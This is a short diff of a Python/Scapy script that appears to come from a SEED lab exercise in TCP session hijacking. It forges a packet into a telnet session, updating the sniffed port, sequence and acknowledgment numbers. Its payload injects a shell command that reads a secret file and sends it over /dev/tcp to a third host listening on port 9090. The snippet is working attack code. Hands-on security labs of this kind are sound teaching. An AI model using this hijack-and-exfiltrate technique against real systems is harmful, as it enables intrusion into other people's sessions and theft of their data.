@@ -14,13 +14,13 @@ def send_tcp_packet(src_ip, dst_ip, src_port, dst_port, seq_num, ack_num, ttl_va
     send(packet, verbose=0)
     print(f"Sent TCP packet from {src_ip}:{src_port} to {dst_ip}:{dst_port} with SEQ={seq_num}, ACK={ack_num}, TTL={ttl_value}, Window Size={window_size}")
 
-# Example usage
+# change the following 9 lines
 source_ip = "10.0.2.4"
 destination_ip = "10.0.2.5"
-source_port = 55202
+source_port = 45736
 destination_port = 23
-sequence_num = 834051386
-acknowledgment_num = 704733961
+sequence_num = 1717083005
+acknowledgment_num = 1242665292
 ttl_value = 64
 window_size = 501
 tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
